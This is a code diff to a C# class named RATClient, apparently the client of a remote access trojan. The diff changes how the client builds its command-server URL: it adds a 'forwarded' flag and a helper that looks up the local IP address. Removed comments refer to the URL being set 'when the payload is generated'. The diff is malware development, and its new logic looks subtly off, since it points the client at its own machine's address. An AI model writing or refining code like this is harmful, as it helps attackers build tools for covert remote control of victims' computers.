@@ -13,6 +13,7 @@ class RATClient
     static string currentDir = Directory.GetCurrentDirectory();
     static string clientIdentifier = GetClientIdentifier();
     static readonly HttpClient client = new HttpClient();
+    static bool forwarded = false; // Set this flag to true if you want to use the forwarded IP
 
     static void Main()
     {
@@ -165,9 +166,24 @@ class RATClient
 
     static string GetServerUrl()
     {
-        // This function gets the server URL dynamically from a config file or predefined source.
-        // For now, we just return the default value, but it can be replaced with reading a config or payload file.
+        string ipAddress = "localhost";  // Default to local IP
+        if (forwarded)  // Check if forwarded flag is set
+        {
+            ipAddress = GetLocalIPAddress();  // Dynamically get the local machine IP
+        }
+        return $"http://{ipAddress}:7777";  // Return the dynamically built URL
+    }
 
-        return "http://localhost:7777";  // Placeholder - this should be dynamically set when the payload is generated
+    static string GetLocalIPAddress()
+    {
+        var host = Dns.GetHostEntry(Dns.GetHostName());
+        foreach (var ip in host.AddressList)
+        {
+            if (ip.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
+            {
+                return ip.ToString();
+            }
+        }
+        return "localhost";  // Return localhost if no IP is found
     }
 }
